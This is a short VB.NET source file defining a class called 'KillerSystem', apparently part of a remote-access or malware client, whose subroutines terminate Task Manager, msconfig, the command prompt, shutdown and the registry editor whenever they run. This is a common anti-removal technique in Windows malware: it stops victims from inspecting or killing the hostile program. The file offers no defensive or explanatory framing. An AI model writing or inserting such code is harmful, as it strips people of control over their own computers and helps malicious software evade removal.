#Region "import"
Imports System.IO
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Data.SqlClient
Imports System.Data
Imports System.Data.OleDb
Imports System.Net
Imports System.Net.Mail
Imports System.Text
Imports System.Reflection
Imports System.ComponentModel
Imports System.Threading
Imports System.Threading.Tasks
Imports AIOTClient
#End Region

Public Class KillerSystem

#Region "system"
    Sub taskmanager()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "taskmgr" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub msconfig()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "msconfig" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub cmd()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "cmd" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub shutdown()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "shutdown" Then
                proc.Kill()
            End If
        Next
    End Sub

    Sub regedit()
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "regedit" Then
                proc.Kill()
            End If
        Next
    End Sub
#End Region

End Class
